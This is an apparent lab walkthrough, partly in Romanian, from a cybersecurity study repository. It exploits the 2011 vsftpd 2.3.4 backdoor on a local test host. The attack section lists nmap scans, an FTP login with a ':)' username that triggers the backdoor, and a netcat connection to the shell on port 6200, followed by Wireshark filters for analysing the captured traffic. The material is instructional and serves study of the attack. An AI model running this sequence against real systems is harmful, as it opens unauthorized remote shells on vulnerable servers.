
### FTP Attack:

   - [About FTP](https://github.com/Dani780-C/Cyber-security/blob/main/learn/_ftp.md)
   - version: *vsftpd 2.3.4*  
   ```In 2011, in the download archive from the FTP service official site was attached a backdoor virus that was able to execute a shell on port 6200. To run the virus, the username for connecting FTP service could be any input followed by a ":)"```  

   - How to hack:
      
         nmap -sSV 192.168.56.102 -p21,6200  
     

<div align="center">
	<br>
   <a href="https://github.com/Dani780-C/Cybersecurity/blob/main/attacks/header.svg">
	<img src="header.svg" width="800" height="400" alt="Image">
   </a>
   <br>
</div>


     Se poate observa ca portul 6200 inca nu este deschis.  
     Folosim comanda ftp pentru a ne conecta la serviciul FTP.  
     Dupa ce vom executa aceasta comanda, va trebui sa introducem datele de login (user si parola).  
     Pentru user vom folosi orice string urmat de ":)", iar parola poate fi nula sau orice string.  
     Despre vulnerabilitate: [vsftpd backdoored](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html)
     
         ftp 192.168.56.102 21
     
     ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-2.png)
     
         nmap 192.168.56.102 -p6200
         
     ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-nmap-2.png)
     
     Se poate vedea dupa o inca scanare a portului 6200 ca acum este deschis, deci ne vom folosi de [netcat](https://github.com/Dani780-C/Cyber-security/blob/main/tools/netcat.md) pentru a ne conecta.
     
         nc -v 192.168.56.102 6200
             
      ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-done.png)
     
   - Analiza trafic:
      - [Captura traficului pentru serviciului FTP in timpul atacului](https://github.com/Dani780-C/Cyber-security/blob/main/captures/ftp-traffic.pcapng)
      - Pentru a filtra traficul din captura wireshark se poate folosi filtrul *tcp.stream eq 0* pentru a vedea doar pachetele dintre atacator si tinta din prima conexiune esuata
      ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-first-connection.png)
      - Pentru a filtra traficul din captura wireshark se poate folosi filtrul *tcp.stream eq 1* pentru a doua conexiune pe portul 6200 prin care s-a efectuat un reverse shell
      ![My Image](https://github.com/Dani780-C/Cyber-security/blob/main/attacks/imgs/ftp-second-conn-port-6200.png)
